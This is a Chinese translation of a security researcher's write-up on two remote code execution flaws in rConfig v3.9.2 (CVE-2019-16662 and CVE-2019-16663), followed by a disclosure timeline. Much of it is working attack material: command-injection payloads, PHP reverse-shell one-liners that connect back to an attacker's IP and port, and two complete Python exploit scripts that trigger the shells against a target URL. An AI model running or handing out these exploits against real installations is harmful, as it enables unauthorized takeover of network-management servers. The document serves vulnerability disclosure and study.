
# [翻译]rConfig v3.9.2 两个 RCE 漏洞(CVE-2019-16663、CVE-2019-16662)

翻译人：cherrir

校对人：lipss

原文：

6b9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6K9r3g2D9L8s2y4Q4x3X3g2K6P5i4y4@1k6h3#2K6i4K6u0r3M7X3y4G2L8X3k6A6k6#2)9J5k6s2j5K6i4K6u0V1z5g2)9J5k6o6u0Q4x3X3c8S2N6i4c8Z5k6h3&6@1K9h3y4S2N6r3g2V1i4K6u0V1j5h3&6V1i4K6u0V1N6h3&6S2N6i4c8Z5k6h3&6@1K9h3y4S2N6r3g2V1i4K6u0V1M7X3y4W2i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4z5g2)9J5k6o6p5$3y4U0j5K6i4K6u0V1j5h3&6V1i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4z5g2)9J5k6o6p5$3y4U0j5J5i4K6u0r3i4K6t1$3L8X3u0K6M7q4)9K6b7R3`.`.

## 关于 rConfig

rConfig是一个开放源码的网络设备配置管理实用工具，用于网络工程师对其网络设备的配置。

![](https://bbs.kanxue.com/upload/attach/201911/776575_8KE857GRFMYWFMS.jpg)

## 关于漏洞的利用

我在两个文件中分别发现了两个远程代码执行漏洞。第一个是`ajaxServerSettingsChk.php`，攻击者可以通过`rootUname`参数发送精心构造的一个 GET 请求，触发未授权 RCE 漏洞。`rootUname`参数在源文件第 2 行中定义，随后会在第 13 行传递给`exec()`函数，攻击者可以构造参数接收内容实现让操作系统执行恶意命令。这个漏洞很容易利用和发现，后面的篇幅中我将介绍如何发现并利用这个漏洞。

第二个漏洞是在`search.crud.php`发现的，这个文件需要通过身份验证才能触发远程代码执行漏洞。这个漏洞可以通过构造一个包含有两个参数的 GET 请求触发，

其中`searchTerm`参数可以包含任意值，但该参数必须存在，才能执行到第 63 行的`exec()`函数。

跟我平常找 RCE 漏洞的方法一样，因此我使用自己开发的一个[Python脚本](https://bbs.kanxue.com/elink@fd0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0K9r3q4K6K9$3q4J5i4K6u0r3f1V1y4q4f1$3y4S2L8X3&6W2M7R3`.`.)来列出有哪些不安全的函数。这个脚本在先前的案例研究中曾经使用过。

## 未授权 RCE 分析

运行这个脚本过后输出了一些结果，我开始分析这些输出结果并且注意到路径为`install/lib/ajaxHandlers/`的`ajaxServerSettingsChk.php`文件，部分代码如下：

![](https://bbs.kanxue.com/upload/attach/201911/776575_64JQ77DTVK4W6PH.jpg)

从代码可以看出，第 2 行脚本代码的意思是将 GET 请求中的`rootUname`参数值赋值到`$rootUname`变量中。

在第 12 行，代码将`$rootUname`与一些字符串拼接在一起，保存到`rootTestCmd1`变量，然后传递给第 13 行的`exec()`函数。后续代码执行了相同的操作。

因此，我们只需注入特定构造命令，在第 13 行跳出转义字符串来执行命令，为此，我们可以使用如下的 Payload：

```
;your command #
```

为了方便测试，我修改了 13 行的`exec()`函数，把`exec()`执行后的命令返回结果显示到页面上，然后编码发送 Payload，得到了如下结果：

![](https://bbs.kanxue.com/upload/attach/201911/776575_HRNJQ952F5U53SG.jpg)

我们可以看到发送编码后 Payload，`rootUname`参数里经过编码的`; id #`命令被成功执行了两次。

为了得到 shell，使用下面的 Payload：

```
;php -r '$sock=fsockopen(ip,port);exec("/bin/sh -i <&3 >&3 2>&3");' #
```

默认的 CentOS 7.7 mini 版本没有安装`nc`，所以使用这条 Payload 更方便测试。

在使用 Burp 编码并发送有效 Payload 之后，我们将获得以下内容：

![](https://bbs.kanxue.com/upload/attach/201911/776575_AE6G45N99MXN9X9.jpg)

我们反弹回一个 shell！

为了自动化完成该过程，我简单编写了一个 python 代码来利用这个漏洞：

脚本地址：[98fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3L8h3S2S2M7$3E0S2M7W2)9J5c8X3y4W2j5U0j5#2k6X3p5@1j5$3p5#2y4$3x3K6j5$3c8U0j5$3x3I4k6h3c8X3k6e0t1K6z5e0l9&6x3o6u0W2](https://bbs.kanxue.com/elink@b77K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3L8h3S2S2M7$3E0S2M7W2)9J5c8X3y4W2j5U0j5#2k6X3p5@1j5$3p5#2y4$3x3K6j5$3c8U0j5$3x3I4k6h3c8X3k6e0t1K6z5e0l9&6x3o6u0W2)

```
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16662
# Vendor Homepage: ed3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5$3!0F1k6X3W2Y4i4K6u0W2j5$3!0E0i4K6u0r3
# Software link: 67aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5$3!0F1k6X3W2Y4i4K6u0W2j5$3!0E0i4K6u0r3k6r3!0%4L8X3I4G2j5h3b7`.
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22

import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 4:
    print "[+] Usage : ./exploit.py target ip port"
    exit()

target = sys.argv[1]

ip = sys.argv[2]

port = sys.argv[3]

payload = quote(''';php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'#'''.format(ip, port))

install_path = target + "/install"

req = requests.get(install_path, verify=False)
if req.status_code == 404:
    print "[-] Installation directory not found!"
    print "[-] Exploitation failed !"
    exit()
elif req.status_code == 200:
    print "[+] Installation directory found!"
url_to_send = target + "/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=" + payload

print "[+] Triggering the payload"
print "[+] Check your listener !"

requests.get(url_to_send, verify=False)
```

如下是执行脚本的结果：

![](https://bbs.kanxue.com/upload/attach/201911/776575_RD4UN8EKXHP3WKY.jpg)

再次反弹得到 shell！

## 授权验证的 RCE 分析

RCE 扫描器的另一个结果路径在`lib/crud/`的`search.crud.php`文件中，这个漏洞需要登录验证后才能利用。片段代码如下：

![](https://bbs.kanxue.com/upload/attach/201911/776575_J3GNJJEZB2KBGCS.jpg)

首先我们需要传入一个 GET 参数`searchTerm`来通过第 25 行的`if`语句，然后需要传入参数`catCommand`，在第 61 行被拼接`$command`参数后，传入第 61 行的函数去执行，`catCommand`参数就是包含 Payload 的关键参数。

首先，我们需要绕过第 25 行的`if`语句。发送名为`searchTerm`参数的 GET 请求，这样就能进入代码判断逻辑内部，然后我们还需要联合一个名为`catCommand`参数，这个参数里面包含我们的 Payload，在第 61 行与一些字符串拼接起来后，进入代码判断逻辑内部函数，存储到`$command`变量中，在第 63 行传递给`exec()`函数执行。

这里将使用`sleep`这个 Payload 来测试漏洞，这个 Payload 将尝试睡眠 5 秒钟，执行后观察响应时间并与正常响应时间进行比较就能判断执行成功与否。观察第 61 行的代码，可以有多种不同的 Payload。

此处我的 Payload：

```
""&&$(`sleep 5`)#
```

通过 Burp 发送这个 Payload，我们能得到如下的响应信息：

![](https://bbs.kanxue.com/upload/attach/201911/776575_WVQK2HVW64S897W.jpg)

响应时间延迟了 5000+ 毫秒，也就意味着命令执行成功了！

当然这里不限于仅仅是用`sleep`命令做测试，除此之外我们也可以尝试多种 Payload。

为了得到一个 shell，我使用了 php oneliner 并将其构造为可与串联字符串一起使用，如下所示：

```
""&&php -r '$sock=fsockopen("192.168.178.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'#
```

为了自动化利用该漏洞，我开发了一段简单的 python 代码：

代码地址：

[c52K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3L8h3S2S2M7$3E0S2M7W2)9J5c8X3f1%4k6e0b7#2y4r3x3%4j5$3t1H3k6r3b7&6j5e0p5K6z5h3t1H3j5e0b7K6y4U0V1I4k6e0t1#2z5r3p5H3](https://bbs.kanxue.com/elink@af0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3L8h3S2S2M7$3E0S2M7W2)9J5c8X3f1%4k6e0b7#2y4r3x3%4j5$3t1H3k6r3b7&6j5e0p5K6z5h3t1H3j5e0b7K6y4U0V1I4k6e0t1#2z5r3p5H3)

```
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16663
# Vendor Homepage: b1dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5$3!0F1k6X3W2Y4i4K6u0W2j5$3!0E0i4K6u0r3
# Software link: 3c8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5$3!0F1k6X3W2Y4i4K6u0W2j5$3!0E0i4K6u0r3k6r3!0%4L8X3I4G2j5h3b7`.
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22

import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print "[+] Usage : ./exploit.py target username password ip port"
    exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = sys.argv[5]

request = requests.session()

login_info = {
    "user": username,
    "pass": password,
    "sublogin": 1
}

login_request = request.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)

if dashboard_request.status_code == 200:
    print "[+] LoggedIn successfully"
    payload = '''""&&php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'#'''.format(ip, port)
    encoded_request = target+"/lib/crud/search.crud.php?searchTerm=anything&catCommand={0}".format(quote(payload))
    print "[+] triggering the payload"
    print "[+] Check your listener !"
    exploit_req = request.get(encoded_request)

elif dashboard_request.status_code == 302:
    print "[-] Wrong credentials !"
    exit()
```

运行漏洞利用代码后，我们能看到如下结果：

![](https://bbs.kanxue.com/upload/attach/201911/776575_2DXXX4TGE59ZHTK.jpg)

成功反弹一个 shell！

## 漏洞披露

我在 2019 年 9 月 19 日向 rConfig main developer 报告了这两个漏洞，但是没有得到任何修复发布日期，甚至没有得到他们将修复该漏洞的声明。

所以在没有回应的 35 天后，我公布了这个漏洞。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2019-11-18 21:16 被 cherrir 编辑，原因：
